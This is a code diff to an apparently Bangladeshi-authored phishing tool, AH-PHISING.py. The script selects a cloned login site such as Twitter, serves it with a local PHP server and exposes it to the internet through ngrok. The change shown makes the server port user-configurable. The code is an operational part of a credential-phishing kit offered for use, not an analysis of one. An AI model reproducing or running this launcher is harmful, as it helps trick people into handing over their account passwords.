@@ -58,9 +58,10 @@ elif Abirhossain=="14":
 	website="twitter"
 else:
 	os.system("python AH-PHISING.py")
+port=input(green+"your port :")
 os.system("clear")
-os.system("cd site/"+website+"/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
-os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
+os.system("cd site/"+website+"/ && php -S 127.0.0.1:"+port+"> /dev/null 2>&1 &")
+os.system("./Abir/ngrok http 127.0.0.1:"+port+"> /dev/null 2>&1 &")
 os.system("clear")
 def an():
 	print(red+""" $$$$$$\          $$$$$$$\  $$\   $$\ $$$$$$\  $$$$$$\  
